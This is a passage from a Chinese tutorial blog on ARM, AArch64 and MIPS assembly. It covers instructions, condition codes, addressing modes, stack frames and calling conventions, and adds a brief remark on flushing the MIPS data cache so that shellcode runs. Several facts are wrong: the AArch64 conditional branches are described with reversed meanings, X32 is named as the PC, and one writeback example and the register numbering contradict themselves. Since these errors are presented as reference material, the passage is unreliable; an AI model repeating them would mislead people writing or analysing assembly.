class="table-container"><table><thead><tr><th><strong>指令</strong></th><th><strong>描述</strong></th><th><strong>指令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>MOV</td><td>移动数据</td><td>EOR</td><td>按位异或</td></tr><tr><td>MVN</td><td>移动并取反</td><td>LDR</td><td>加载</td></tr><tr><td>ADD</td><td>加</td><td>STR</td><td>存储</td></tr><tr><td>SUB</td><td>减</td><td>LDM</td><td>加载多个</td></tr><tr><td>MUL</td><td>乘</td><td>STM</td><td>存储多个</td></tr><tr><td>LSL</td><td>逻辑左移</td><td>PUSH</td><td>入栈</td></tr><tr><td>LSR</td><td>逻辑右移</td><td>POP</td><td>出栈</td></tr><tr><td>ASR</td><td>算术右移</td><td>B</td><td>跳转</td></tr><tr><td>ROR</td><td>右旋</td><td>BL</td><td>Link跳转</td></tr><tr><td>CMP</td><td>比较</td><td>BX</td><td>分支跳转</td></tr><tr><td>AND</td><td>按位与</td><td>BLX</td><td>使用Link分支跳转</td></tr><tr><td>ORR</td><td>按位或</td><td>SWI/SVC</td><td>系统调用</td></tr></tbody></table></div><h5 id="LDR-和-STR"><a href="#LDR-和-STR" class="headerlink" title="LDR 和 STR"></a>LDR 和 STR</h5><p>ARM使用加载存储模型进行内存访问，这意味着只有加载/存储（LDR和STR）指令才能访问内存</p><p>通常，LDR用于将某些内容从内存加载到寄存器中，而STR用于将某些内容从寄存器存储到内存地址中</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/iasd121sd.png" alt=""></p><p>LDR操作：将R0中的地址的值加载到R2寄存器中</p><p>STR操作：将R2中的值存储到R1中的内存地址处</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/%E5%9B%BE%E7%89%876.png" alt=""></p><h5 id="LDM-和-STM"><a href="#LDM-和-STM" class="headerlink" title="LDM 和 STM"></a>LDM 和 STM</h5><p>在执行压栈和出栈的指令时，通常使用LDMIA/STMDB</p><p>但事实上在汇编的过程中，可以看到LDMIA和STMDB指令<strong>已转换为PUSH和POP</strong>，那是因为 PUSH和STMDB sp!, reglist，POP和LDMIA sp! Reglist是等价的</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/asfasdzxcvrte.png" alt=""></p><h5 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h5><p>分支指令分为三种：</p><p><strong>分支(B)</strong></p><p>​    简单跳转到功能</p><p><strong>分支链接(BL)</strong></p><p>​    将(PC + 4)保存为LR并跳转至功能</p><p><strong>分支交换(BX)和分支链接交换(BLX)</strong></p><p>与B / BL +exchange指令集相同(ARM &lt;-&gt; Thumb)</p><p>需要一个寄存器作为第一个操作数：BX / BLX reg</p><p>BX / BLX用于将指令集从ARM交换到Thumb</p><p><u>不过AARCH64中貌似去除了thumb转换指令</u></p><h5 id="指令后缀"><a href="#指令后缀" class="headerlink" title="指令后缀"></a>指令后缀</h5><div class="table-container"><table><thead><tr><th>后缀</th><th>描述</th></tr></thead><tbody><tr><td>S</td><td>更新 APSR(应用程序状态寄存器，如进位、溢出、零和负标志)，例如：<code>ADDS R0，R1;该ADD操作会更新APSR</code></td></tr><tr><td>EQ， NE， CS， CC， MI，PL，VS，VC，HI，LS，GE， LT， GT， LE</td><td>条件执行后缀，若满足相应条件则执行后面的语句，例如：<code>BEQ label;若之前的操作得到相等的状态（状态寄存器Z置位），则跳转至 label</code></td></tr><tr><td>.N，.W</td><td>指定使用的是 16 位指令 (narrow) 或 32 位指令(wide）</td></tr><tr><td>.32，.F32</td><td>指定 32 位单精度运算, 对于多数工具链, 32 后缀是可选的</td></tr><tr><td>.64，.F64</td><td>指定 64 位单精度运算, 对于多数工具链, 64 后缀是可选的</td></tr></tbody></table></div><p>可以通过 S 后缀的指令影响状态寄存器的标志位，再通过各类条件码后缀执行相应判断</p><div class="table-container"><table><thead><tr><th>条件码助记符</th><th>条件码</th><th>标志</th><th>含义</th></tr></thead><tbody><tr><td>EQ</td><td>0000</td><td>Z=1</td><td>相等</td></tr><tr><td>NE</td><td>0001</td><td>Z=0</td><td>不相等</td></tr><tr><td>CS/HS</td><td>0010</td><td>C=1</td><td>无符号数大于或等于</td></tr><tr><td>CC/LO</td><td>0011</td><td>C=0</td><td>无符号数小于</td></tr><tr><td>MI</td><td>0100</td><td>N=1</td><td>负数</td></tr><tr><td>PL</td><td>0101</td><td>N=0</td><td>正数</td></tr><tr><td>VS</td><td>0110</td><td>V=1</td><td>溢出</td></tr><tr><td>VC</td><td>0111</td><td>V=0</td><td>没有溢出</td></tr><tr><td>HI</td><td>1000</td><td>C=1，Z=0</td><td>无符号数大于</td></tr><tr><td>LS</td><td>1001</td><td>C=0 或 Z=1</td><td>无符号数小于或等于</td></tr><tr><td>GE</td><td>1010</td><td>N=V</td><td>带符号数大于或等于</td></tr><tr><td>LT</td><td>1011</td><td>N!=V</td><td>带符号数小于</td></tr><tr><td>GT</td><td>1100</td><td>Z=0，N=V</td><td>带符号数大于</td></tr><tr><td>LE</td><td>1101</td><td>Z=1 或 N!=V</td><td>带符号数小于或等于</td></tr><tr><td>AL</td><td></td><td>—</td><td>无条件执行</td></tr><tr><td>NV</td><td></td><td>—</td><td>不执行</td></tr></tbody></table></div><p>条件码应用举例：</p><p>比较两个值大小，并进行相应加1处理，C语言代码为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  ( a &gt; b )  </span><br><span class="line"></span><br><span class="line">  a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"></span><br><span class="line">  b++;</span><br></pre></td></tr></table></figure><p> 对应的ARM指令如下（其中R0中保存a 的值，R1中保存b的值）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CMP R0, R1 ; R0与R1比较，做R0-R1的操作</span><br><span class="line"></span><br><span class="line">ADDHI R0, R0, #1 ;若R0 &gt; R1, 则R0 = R0 + 1</span><br><span class="line"></span><br><span class="line">ADDLS R1, R1, #1 ; 若R0 &lt;= R1, 则R1 = R1 + 1</span><br></pre></td></tr></table></figure><h5 id="ARM32与AARCH64部分指令差异"><a href="#ARM32与AARCH64部分指令差异" class="headerlink" title="ARM32与AARCH64部分指令差异"></a>ARM32与AARCH64部分指令差异</h5><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/546sfdr239.png" alt=""></p><h5 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h5><p><code>arm</code>架构下的寄存器和<code>x86_64</code>架构还是有很大区别的，其中<code>R0 ~ R3</code>是用来依次传递参数的，相当于<code>x64</code>下的<code>rdi, rsi, rdx</code>，<code>R0</code>还被用于存储函数的返回值，<code>R7</code>常用来存放系统调用号，<code>R11</code>是栈帧，相当于<code>ebp</code>，在<code>arm</code>中也被叫作<code>FP</code>，相应地，<code>R13</code>是栈顶，相当于<code>esp</code>，在<code>arm</code>中也被叫作<code>SP</code>，<code>R14(LP)</code>是用来存放函数的返回地址的，<code>R15</code>相当于<code>eip</code>，在<code>arm</code>中被叫作<code>PC</code>，但是在程序运行的过程中，<code>PC</code>存储着当前指令往后两条指令的位置，在<code>arm</code>架构中并不是像<code>x86_64</code>那样用<code>ret</code>返回，而是直接<code>pop &#123;PC&#125;</code>。</p><p>在<code>arm</code>中的<code>ldr</code>和<code>str</code>指令是必须清楚的，其中<code>ld</code>就是<code>load</code>（加载），<code>st</code>就是<code>store</code>（存储），而<code>r</code>自然就是<code>register</code>（寄存器），搞明白这些以后，这两个指令就很容易理解了（<code>cond</code>为条件）：</p><p><code>LDR &#123;cond&#125; Rd, &lt;addr&gt;</code>：加载指定地址(<code>addr</code>)上的数据(字)，放入到<code>Rd</code>寄存器中。</p><p><code>STR &#123;cond&#125; Rd, &lt;addr&gt;</code>：将<code>Rd</code>寄存器中的数据(字)存储到指定地址(<code>addr</code>)中。</p><p>当然，这两个指令有很多种写法，灵活多变：</p><p><code>str r2, [r1, #2]</code>：寄存器<code>r2</code>中的值被存放到寄存器<code>r1</code>中的地址加<code>2</code>处的地址中，<code>r1</code>寄存器中的值不变;</p><p><code>str r2, [r1, #2]!</code>：与上一条一样，不过最后<code>r1 += 4</code>，这里的<code>&#123;!&#125;</code>是可选后缀，若选用该后缀，则表示请求回写，也就是当数据传送完毕之后，将最后的地址写入到基址寄存器(<code>Rn</code>)中;</p><p><code>ldr r2, [r1], #-2</code>：将<code>r1</code>寄存器里地址中的值给<code>r2</code>寄存器，最后<code>r1 -= 2</code>；</p><p>上面的立即数或者寄存器也类似，此外还可以有这些写法：</p><p><code>str r2, [r1, r3, LSL#2]</code>：将寄存器<code>r2</code>中的值存储到寄存器<code>r1</code>中的地址加上<code>r3</code>寄存器中的值左移两位后的值所指向的地址中；</p><p><code>ldr r2, [r1], r3, LSL#2</code>：将<code>r1</code>寄存器里地址中的值给<code>r2</code>寄存器，最后<code>r1 += r3 &lt;&lt; 2</code>.</p><p>在<code>arm</code>中仍有<code>mov</code>指令，通常用于寄存器与寄存器间的数据传输，也可以传递立即数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov r1, #0x10`：`r1 = 0x10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov r1, r2`：`r1 = r2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov r1, r2, LSL#2`：`r1 = r2 &lt;&lt; 2</span><br></pre></td></tr></table></figure><p>由此可见，<code>ldr</code>和<code>str</code>指令通常用于寄存器与内存间的数据传递，其中会通过另一个寄存器作为中介，而<code>mov</code>指令则是通常用于两个寄存器之间数值的传递。</p><p>此外，还有数据块传输指令<code>LDM, STM</code>，</p><p>其中提到了<code>STMFD</code>和<code>LDMFD</code>指令，可用作压栈和弹栈，如<code>STMFD SP! ,&#123;R0-R7，LR&#125;</code>和<code>LDMFD SP! ,&#123;R0-R7，LR&#125;</code>，但是在我们拿到的<code>CTF</code>题目中，常见的仍是<code>push &#123;&#125;</code>和<code>pop &#123;&#125;</code>指令。</p><p>还需要知道的是<code>add</code>和<code>sub</code>命令：</p><p><code>add r1, r2, #2</code> 相当于 <code>r1 = r2 + 2</code>；</p><p><code>sub r1, r2, r3</code> 相当于 <code>r1 = r2 - r3</code>.</p><p>还有跳转指令<code>B</code>相关的一些指令，相当于<code>jmp</code>：</p><p><code>B Label</code>：无条件跳转到<code>Label</code>处；</p><p><code>BL Label</code>：当程序跳转到标号<code>Label</code>处执行时，同时将当前的<code>PC</code>值保存到<code>R14</code>中；</p><p><code>BX Label</code>：这里需要先提一下<code>arm</code>指令压缩形式的子集<code>Thumb</code>指令了，不像是<code>arm</code>指令是一条四个字节，<code>Thumb</code>指令一条两个字节，<code>arm</code>对应的<code>cpu</code>工作状态位为<code>0</code>，而<code>Thumb</code>对应的<code>cpu</code>工作状态位为<code>1</code>，我们从其中一个指令集跳到另外一个指令集的时候，需要同时修改其对应的<code>cpu</code>工作状态位，不然会报<code>invalid instrument</code>错误，当<code>BX</code>后面的地址值最后一个<code>bit</code>为<code>1</code>时，则转为<code>Thumb</code>模式，否则转为<code>arm</code>模式，直接<code>pop &#123;pc&#125;</code>这样跳转也有这种特性；</p><p><code>BLX Label</code>：就是<code>BL + BX</code>指令共同作用的效果。</p><p>位运算命令：<code>and orr eor</code> 分别是 按位与、或、异或。</p><h5 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h5><p><code>aarch64</code>和<code>arm</code>架构相比，还是有一些汇编指令上的区别的：</p><p>首先仍是寄存器，在<code>64</code>位下都叫作<code>Xn</code>寄存器了，其对应的低<code>32</code>位叫作<code>Wn</code>寄存器，其中栈顶是<code>X31(SP)</code>寄存器，栈帧是<code>X29(FP)</code>寄存器，<code>X0 ~ X7</code>用来依次传递参数，<code>X0</code>存放着函数返回值，<code>X8</code>常用来存放系统调用号或一些函数的返回结果，<code>X32</code>是<code>PC</code>寄存器，<code>X30</code>存放着函数的返回地址(<code>aarch64</code>中的<code>RET</code>指令返回<code>X30</code>寄存器中存放的地址)。</p><p>然后是跳转指令，仍有<code>B</code>，<code>BL</code>指令，新增了<code>BR</code>指令（向寄存器中的地址跳转），<code>BLR</code>组合指令。<br>还有一些带判断的跳转指令：<code>b.ne</code>是不等则跳转，<code>b.eq</code>是等于则跳转，<code>b.le</code>是大于则跳转，<code>b.ge</code>是小于则跳转，<code>b.lt</code>是大于等于则跳转，<code>b.gt</code>是小于等于则跳转，<code>cbz</code>为结果等于零则跳转，<code>cbnz</code>为结果非零则跳转…</p><p>在<code>aarch64</code>架构下的一大变化就是，不再使用<code>push</code>和<code>pop</code>指令压栈和弹栈了，也没有<code>LDM</code>和<code>STM</code>指令，而是使用<code>STP</code>和<code>LDP</code>指令：</p><p><code>STP x4, x5, [sp, #0x20]</code>：将<code>sp+0x20</code>处依次覆盖为<code>x4，x5</code>，即<code>x4</code>入栈到<code>sp+0x20</code>，<code>x5</code>入栈到<code>sp+0x28</code>，最后<code>sp</code>的位置不变。</p><p><code>LDP x29, x30, [sp], #0x40</code>：将<code>sp</code>弹栈到<code>x29</code>，<code>sp+0x8</code>弹栈到<code>x30</code>，最后<code>sp += 0x40</code>。</p><p>其中，<code>STP</code>和<code>LDP</code>中的<code>P</code>是<code>pair</code>（一对）的意思，也就是说，仅可以同时读/写两个寄存器。</p><h2 id="ARM堆栈和函数调用"><a href="#ARM堆栈和函数调用" class="headerlink" title="ARM堆栈和函数调用"></a>ARM堆栈和函数调用</h2><p>是一种先进后出的数据结构，栈底是第一个进栈的数据所处位置，栈顶是最后一个数据进栈所处的位置。在创建进程时会在栈中分配相应内存，我们使用堆栈来保存局部变量、参数传递、保存寄存器的值</p><p>​    ARM中主要使用PUSH和POP指令与堆栈进行交互</p><p>​    注意，这里的PUSH和POP是其他一些与内存相关的指令的别名，而不是真实的指令</p><p>四种堆栈：<strong>ARM采用的满降栈</strong></p><p>●满/空栈</p><p>根据SP指针指向的位置，栈可以分为满栈和空栈</p><p>  满栈：当堆栈指针总是指向最后压入堆栈的数据</p><p>  空栈：当堆栈指针总是指向下一个将要放入数据的空位置</p><p>●升/降栈</p><p>根据SP指针移动的方向，栈可以分为升栈和降栈</p><p>  升栈：随着数据的入栈，SP指针从低地址-&gt;高地址移动</p><p>  降栈：随着数据的入栈，SP指针从高地址-&gt;低地址移动</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cvb344asd10.png" alt=""></p><p>这是不同的栈使用的压栈/出栈(存储多个/加载多个)指令:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/sadasdas11.png" alt=""></p><h3 id="ARM栈帧"><a href="#ARM栈帧" class="headerlink" title="ARM栈帧"></a>ARM栈帧</h3><p>栈帧(stack frame)就是一个函数所使用的那部分栈，所有函数的栈帧串起来就组成了一个完整的栈。栈帧的两个边界分别由fp(r11)和sp(r13)来限定。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-12-03_200916.png" alt=""></p><p>​    前面描述的是ARM的栈帧布局方式。main stack frame为调用函数的栈帧，func1 stack frame为当前函数(被调用者)的栈帧，栈底在高地址，栈向下增长</p><p>​    FP就是栈基址，它指向函数的栈帧起始地址；SP则是函数的栈指针，它指向栈顶的位置。ARM压栈的顺序依次为当前函数指针PC、返回指针LR、栈指针SP、栈基址FP、传入参数个数及指针、本地变量和临时变量</p><p>​    如果函数准备调用另一个函数，跳转之前临时变量区先要保存另一个函数的参数。从main函数进入到func1函数，main函数的上边界和下边界保存在被它调用的栈帧里面。</p><p>   ARM也可以用栈基址和栈指针明确标示栈帧的位置，栈指针SP一直移动</p><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>​    1、比较两个值大小, C 语言代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(a &gt; b) a++; else b++;</span><br></pre></td></tr></table></figure><p>​    对应的 ARM 指令代码如下：（设 R0 为 a，R1 为 b）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CMP R0, R1         ;R0与R1比较 </span><br><span class="line">ADDHI R0,R0,#1     ;若R0 &gt; R1，则R0 = R0 + 1 </span><br><span class="line">ADDLS R1,R1,#1     ;若R0 &lt;= R1，则R1 = R1 + 1</span><br></pre></td></tr></table></figure><p>​    2、若两个条件均成立，则将这两个数值相加，C 语言代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((a != 10)&amp;&amp;(b != 20)) a = a + b;</span><br></pre></td></tr></table></figure><p>​    对应的 ARM 指令代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CMP R0,#10     ;比较R0是否为10 </span><br><span class="line">CMPNE R1,#20   ;若R0不为10，则比较R1是否为20 </span><br><span class="line">ADDNE R0,R0,R1 ;若R0不为10且R1不为20，则执行 R0 = R0+R1</span><br></pre></td></tr></table></figure><p>​    3、若两个条件有一个成立，则将这两个数值相加，C 语言代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((a!=10)||(b!=20)) a=a+b;</span><br></pre></td></tr></table></figure><p>​    对应的 ARM 指令代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CMP R0,#10      </span><br><span class="line">CMPEQ R1,#20   </span><br><span class="line">ADDNE R0,R0,R1</span><br></pre></td></tr></table></figure><h3 id="处理器内数据传送"><a href="#处理器内数据传送" class="headerlink" title="处理器内数据传送"></a>处理器内数据传送</h3><p>以32为例</p><div class="table-container"><table><thead><tr><th>指令名称</th><th>语法</th><th>指令作用</th><th>注意</th></tr></thead><tbody><tr><td>MOV</td><td><code>MOV Rx,Ry/#num32</code></td><td>将源操作数的值赋给目的操作数</td><td></td></tr><tr><td>MRS</td><td><code>MRS Rx,Rs</code></td><td>同 MOV</td><td>源操作数应为特殊寄存器</td></tr><tr><td>MSR</td><td><code>MSR Rs,Rx</code></td><td>同 MOV</td><td>目的操作数应为特殊寄存器</td></tr><tr><td>MOVW</td><td><code>MOVW Rx,#num16</code></td><td>将源操作数赋给目的操作数的低 16 位</td><td>高位清零</td></tr><tr><td>MOVT</td><td><code>MOVT Rx,#num16</code></td><td>将源操作数赋给目的操作数的高 16 位</td><td>低位不变</td></tr></tbody></table></div><h3 id="不同数据大小的存储器访问"><a href="#不同数据大小的存储器访问" class="headerlink" title="不同数据大小的存储器访问"></a>不同数据大小的存储器访问</h3><div class="table-container"><table><thead><tr><th>数据类型</th><th>读存储器指令</th><th>写存储器指令</th><th>语法</th></tr></thead><tbody><tr><td>32 位</td><td>LDR</td><td>STR</td><td><code>LDR Rx,ADDR;将地址ADDR上的值赋给Rx</code> <code>STR Rx,ADDR;将Rx的值赋给地址为ADDR的存储空间</code></td></tr><tr><td>16 位有符号</td><td>LDRSH</td><td>无</td><td></td></tr><tr><td>16 位无符号</td><td>LDRH</td><td>STRH</td><td></td></tr><tr><td>8 位有符号</td><td>LDRSB</td><td>无</td><td></td></tr><tr><td>8 位无符号</td><td>LDRB</td><td>STRB</td><td></td></tr><tr><td>多个 32 位</td><td>LDM</td><td>STM</td><td>LDM、STM</td></tr><tr><td>双字（64 位）</td><td>LDRD</td><td>STRD</td><td><code>LDRD/STRD R1,R2,ADDR;从地址ADDR上读出两个字并分别赋给两个寄存器</code></td></tr><tr><td>栈操作（32 位）</td><td>POP</td><td>PUSH</td><td>PUSH、POP</td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ldr指令的格式：</span><br><span class="line">LDR R0, [R1]</span><br><span class="line">LDR R0, =NAME</span><br><span class="line">LDR R0, =0X123</span><br><span class="line">对于第一种没有等号的情况，R1寄存器对应地址的数据被取出放入R0</span><br><span class="line">对于第二种有等号的情况，R0寄存器的值将为NAME标号对应的地址。</span><br><span class="line">对于第三种有等号的情况，R0寄存器的值将为立即数的值</span><br></pre></td></tr></table></figure><h3 id="存储器访问方式-地址表达式"><a href="#存储器访问方式-地址表达式" class="headerlink" title="存储器访问方式(地址表达式)"></a>存储器访问方式(地址表达式)</h3><h4 id="立即数偏移"><a href="#立即数偏移" class="headerlink" title="立即数偏移"></a>立即数偏移</h4><p>数据传输使用的存储器地址为：寄存器中的数值 + 立即数常量（偏移地址）</p><p><code>LDRB R0,[R1,#0x3];</code>从地址R1+0x3中读取一个字节并将其存入R0</p><p>加入感叹号（!）可更新存放地址的寄存器的值（写回）：<br><code>LDRB R0,[R1,#0x3]!;</code>从地址R1+0x3中读取一个字节并将其存入R0后令R1=R1+0x3</p><h4 id="寄存器偏移"><a href="#寄存器偏移" class="headerlink" title="寄存器偏移"></a>寄存器偏移</h4><p> 类似立即数偏移，但这里的寄存器可以通过移位指令进行移位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR R3,[R0, R2, LSL #2];将存储器[R0+(R2&lt;&lt;2)]读入R3</span><br><span class="line">LDR R3,[R0, R2];将存储器[R0+R2]读入R3</span><br></pre></td></tr></table></figure><p> 注意：这里进行的是前序偏移，也就是以地址偏移后的值为地址进行取值，下面介绍一下后序寻址：</p><p> 后序寻址是取地址上的值，后进行地址偏移：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDR R0, [R1], #offset;读取存储器[R1],然后R1被赋值为R1+偏移</span><br></pre></td></tr></table></figure><p>后序寻址不能使用 R14（SP）或 R15（PC）。</p><h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><div class="table-container"><table><thead><tr><th>指令名称</th><th>语法</th><th>指令作用</th></tr></thead><tbody><tr><td>B</td><td><code>B label</code></td><td>跳转到标号对应的地址，属于相对跳转（会计算标号和当前 PC 的差），跳转范围为 ±2KB（可添加. W 后缀使用 32 位版本的指令）</td></tr><tr><td>BX</td><td><code>BX Rx</code></td><td>跳转到存放于寄存器 Rx 中的地址值，并基于 Rx 第 0 位设置处理器执行状态（Cortex-M 只支持 Thumb 状态，因此第 0 位必须为 1）</td></tr></tbody></table></div><h4 id="函数调用-1"><a href="#函数调用-1" class="headerlink" title="函数调用"></a>函数调用</h4><div class="table-container"><table><thead><tr><th>指令名称</th><th>语法</th><th>指令作用</th></tr></thead><tbody><tr><td>BL</td><td><code>BL label</code></td><td>跳转到标号位置并将返回地址保存到链接寄存器 R14（LR）中</td></tr><tr><td>BLX</td><td><code>BLX Rx</code></td><td>跳转到存放于寄存器 Rx 中的地址值并将返回地址保存到 LR 中，以及更新 EPSR 中的 T 位为 Rx 的最低位</td></tr></tbody></table></div><p>程序计数器 R15（PC）为跳转目标地址（即将标号 / 地址赋给 PC）<br>返回地址即 BL/BLX 指令后的指令的地址<br>由于 Cortex-M 只支持 Thumb 状态，因此使用 BLX 指令时，Rx 的第 0 位必须为 1</p><p>函数调用和标号跳转的区别在于，函数调用需要将返回地址保存，这也是 BL 和 BLX 与 B 和 BX 的区别</p><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><h3 id="AAPCS"><a href="#AAPCS" class="headerlink" title="AAPCS"></a>AAPCS</h3><p>在较早之前,ARM过程调用标准叫做 <code>APCS</code> (ARM Procedure Call Standard)，</p><p>Thumb 的过程调用标准为 <code>TPCS</code>。</p><p>如今这两种叫法已经废弃，统一称作 <code>AAPCS</code> (Procedure Call Standard for the ARM Architecture)。</p><h3 id="thumb-amp-arm"><a href="#thumb-amp-arm" class="headerlink" title="thumb&amp;arm"></a>thumb&amp;arm</h3><p>ARM架构有两种指令编码:ARM and THUMB</p><p>ARM指令集使用32位指令(不论32位还是64位)，而Thumb指令集使用16位指令，旨在提高代码密度，降低存储和带宽要求。在ARM体系结构中，处理器可以在ARM和Thumb指令之间切换执行。</p><div class="table-container"><table><thead><tr><th></th><th>Thumb 状态</th><th>ARM 状态</th></tr></thead><tbody><tr><td>指令集</td><td>Thumb 指令集</td><td>ARM 指令集</td></tr><tr><td>指令长度</td><td>16 位（半字指令）</td><td>32 位</td></tr><tr><td>指令执行条件</td><td>大多数指令无条件执行</td><td>大多数指令有条件执行</td></tr><tr><td>优点</td><td>低功耗，存储空间要求低</td><td>代码需要的指令数少，性能高</td></tr></tbody></table></div><h3 id="EABI"><a href="#EABI" class="headerlink" title="EABI"></a>EABI</h3><p>EABI是嵌入式应用二进制接口（Embedded Application Binary Interface）。ARM EABI是一种与ARM架构相关的二进制接口标准，旨在确保在嵌入式系统中编写的软件的二进制兼容性。</p><p>EABI定义了一组规范，涉及到函数调用规约、数据对齐、异常处理、堆栈管理等方面。这有助于确保在不同的编译器、操作系统和库之间生成的二进制程序可以在ARM架构的嵌入式系统上正确运行</p><h3 id="el-amp-hf"><a href="#el-amp-hf" class="headerlink" title="el&amp;hf"></a>el&amp;hf</h3><p><strong>armel</strong>是arm eabi little endian的缩写</p><p><strong>armhf</strong>是arm hard float的缩写</p><p><strong>arm64</strong>,64位的arm默认就是hf的，因此不需要hf的后缀。</p><p><strong>armel和armhf的区别</strong></p><p>它们的区别<u>体现在浮点运算</u>上，它们在进行浮点运算时都会使用fpu，<strong>但是armel传参数用普通寄存器</strong>，<strong>而armhf传参数用的是fpu的寄存器</strong>，因此armhf的浮点运算性能更高。</p><hr><h1 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>mips是大端(big-endian)架构，而mipsel是小端(little-endian)架构。指令的用法是差不多的。</li><li>MIPS固定4字节指令长度；</li><li>内存中的数据访问（load/store）必须严格对其（至少4字节对齐）；</li><li>跳转指令只有26位目标地址，加上2位对齐位，可寻址28位的空间，即256MB；</li><li>条件分支指令只有16位跳转地址，加上2位对齐位，可寻址18位的空间，即256KB；</li><li>流水线效应。MIPS采用了高度的流水线，其中最重要的就是分支延迟效应。在分支跳转语句后面那条语句叫分支延迟槽。实际上，在程序执行到分支语句时，当他刚把要跳转的地址填充好（填充到代码计数器里），还没有完成本条指令时，分支语句后面的那个指令就已经执行了，其原因就是流水线效应——几条指令同时执行，只是处于不同的阶段，mips不像其它架构那样存在流水线阻塞。所以分支跳转语句的下一条指令通常都是空指令nop或一些其他有用的语句。</li><li>缓存刷新机制：MIPS CPUs有两个独立的cache:指令cache和数据cache。 指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush, 将数据写回到主内存。攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中。当payload触发漏洞， 劫持程序执行流程的时候，会去执行内存中的shellcode.如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。(通常执行sleep(1)刷新)</li></ul><h2 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h2><p>MIPS无论是32位还是64位都有32个通用寄存器,以及2个特殊的寄存器(hi、lo)用于保存乘法和除法指令的结果，还有一个计数寄存器pc。</p><p>寄存器分为两类：通用寄存器（GPR）和特殊寄存器。通用寄存器：MIPS体系结构中有32个通用寄存器，汇编程序中用$0~$31表示。也可以用名称表示，如$sp、$t1、$ra等。</p><div class="table-container"><table><thead><tr><th style="text-align:left">编号</th><th style="text-align:left">寄存器名称</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">$0</td><td style="text-align:left">$zero</td><td style="text-align:left">第0号寄存器，其值始终为0。</td></tr><tr><td style="text-align:left">$1</td><td style="text-align:left">$at</td><td style="text-align:left">保留寄存器</td></tr><tr><td style="text-align:left">$2-$3</td><td style="text-align:left">$v0-$v1</td><td style="text-align:left">values，保存表达式或函数返回结果</td></tr><tr><td style="text-align:left">$4-$7</td><td style="text-align:left">$a0-$a3</td><td style="text-align:left">argument，作为函数的前四个参数</td></tr><tr><td style="text-align:left">$8-$15</td><td style="text-align:left">$t0-$t7</td><td style="text-align:left">temporaries，供汇编程序使用的临时寄存器</td></tr><tr><td style="text-align:left">$16-$23</td><td style="text-align:left">$s0-$s7</td><td style="text-align:left">saved values，子函数使用时需先保存原寄存器的值</td></tr><tr><td style="text-align:left">$24-$25</td><td style="text-align:left">$t8-$t9</td><td style="text-align:left">temporaries，供汇编程序使用的临时寄存器，补充$t0-$t7。</td></tr><tr><td style="text-align:left">$26-$27</td><td style="text-align:left">$k0-$k1</td><td style="text-align:left">保留，中断处理函数使用</td></tr><tr><td style="text-align:left">$28</td><td style="text-align:left">$gp</td><td style="text-align:left">global pointer，全局指针</td></tr><tr><td 